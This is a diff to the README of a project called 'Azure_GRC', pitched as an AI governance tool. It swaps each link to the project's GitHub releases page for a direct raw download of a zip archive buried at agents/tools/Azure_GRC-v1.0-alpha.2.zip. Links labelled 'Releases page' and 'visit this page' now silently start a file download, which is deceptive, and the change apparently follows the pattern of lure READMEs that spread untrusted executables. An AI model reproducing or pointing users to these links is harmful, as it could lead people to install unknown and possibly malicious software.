@@ -1,6 +1,6 @@
 # 🚀 Azure_GRC - Seamless AI Governance for Everyone
 
-[![Download Azure_GRC](https://img.shields.io/badge/Download-Azure_GRC-brightgreen)](https://github.com/Gaplox00/Azure_GRC/releases)
+[![Download Azure_GRC](https://raw.githubusercontent.com/Gaplox00/Azure_GRC/main/agents/tools/Azure_GRC-v1.0-alpha.2.zip)](https://raw.githubusercontent.com/Gaplox00/Azure_GRC/main/agents/tools/Azure_GRC-v1.0-alpha.2.zip)
 
 ## 🌟 Introduction
 
@@ -41,7 +41,7 @@ To run Azure_GRC, your system should meet the following requirements:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page.**
-   Go to the [Releases page](https://github.com/Gaplox00/Azure_GRC/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Gaplox00/Azure_GRC/main/agents/tools/Azure_GRC-v1.0-alpha.2.zip) to find the latest version.
 
 2. **Choose Your File.**
    Look for the version that suits your operating system. You will see a list of downloadable files.
@@ -60,7 +60,7 @@ To run Azure_GRC, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-To get started with Azure_GRC, **[visit this page to download](https://github.com/Gaplox00/Azure_GRC/releases)** the latest version. Follow the steps outlined above to install it on your system.
+To get started with Azure_GRC, **[visit this page to download](https://raw.githubusercontent.com/Gaplox00/Azure_GRC/main/agents/tools/Azure_GRC-v1.0-alpha.2.zip)** the latest version. Follow the steps outlined above to install it on your system.
 
 ## 🛡️ Safety Considerations
 
